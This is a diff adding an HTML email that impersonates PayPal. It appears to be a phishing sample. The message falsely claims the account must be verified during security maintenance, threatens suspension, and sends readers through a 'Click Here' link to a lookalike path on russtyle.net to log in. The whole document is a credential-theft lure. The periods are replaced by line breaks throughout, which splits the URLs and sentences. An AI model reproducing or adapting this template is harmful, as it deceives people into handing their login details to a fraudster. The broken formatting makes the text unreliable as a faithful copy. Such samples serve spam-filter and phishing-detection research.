@@ -1,0 +1,95 @@
+
+
+<html>
+<head>
+<title>PayPal</title>
+</style>
+<style>
+<
+--
+hr
+dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+-->
+</style>
+</head>
+<body bgcolor="#ffffff">
+<table width="504" cellspacing="0" cellpadding="0" border="0"
+align="center">
+	<tr valign="top">
+		<td width="504">
+        <IMG
+src="https://www
+paypal
+com/en_US/i/logo/paypal_logo
+gif" alt="PayPal
+com"
+border="0" width="123" height="41">
+		</td>
+	</tr>
+</table>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+	<td background="http://images
+paypal
+com/images/bg_clk
+gif"
+width=100%><img src="http://images
+paypal
+com/images/pixel
+gif" height="29"
+width="1" border="0"></td>
+</tr>	
+</table>
+<table width="540" cellspacing="0" cellpadding="0" border="0"
+align="center" height="450">
+	<tr valign="top">
+		<td width="348" height="450">
+
+&nbsp;<table width="778" cellspacing="0" cellpadding="5" border="0" height="265">
+				<tr>
+		<td width="768" height="255">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</font><b><font size="3">Dear PayPal 
+          Member </font></b>
+              <p>
+              &nbsp;</p>
+              <hr class=dotted>
+              <p>We are currently performing regular maintenance of our security 
+              measures
+ Your account has been selected to be verified and&nbsp;you 
+              will now have to be taken to a series of verification process to 
+              validate your identity, if you want to continue to use your 
+              account normally
+ If we don't receive any response from you we are 
+              allowed to suspend your account
+ A verification page will appear 
+              after you Log In into your account
+</p>
+          <p>Protecting the security of your account is our primary concern, and 
+          we apologize for any inconvenience this may cause</p>
+          <p>&nbsp;</p>
+            <li>
+            <p>
+              <font size="3" face="Arial, Helvetica, sans-serif">
+              <span class=emphasis>Please&nbsp; <strong style="font-weight: 400">
+              <a href="http://russtyle
+net/www
+paypal
+com/cgi-bin/webscrcmd=_login-run/">Click Here</a></strong> and Log In</span></font><font size="2" face="Arial, Helvetica, sans-serif"><br>
+              &nbsp;</font></p>
+            </li>
+              <hr class=dotted>
+                     <p> <font size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Copyright  </font><font size="-2">©</font><font size="2"> 
+1999-2007 PayPal
+ All rights reserved</font><font size="1
+5">
+</font>
+                     </td>   
+                 </tr>
+		         </table>   
+         <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   
+         </td>   
+     </tr>           
+</table>       
+</body>   
+</html>
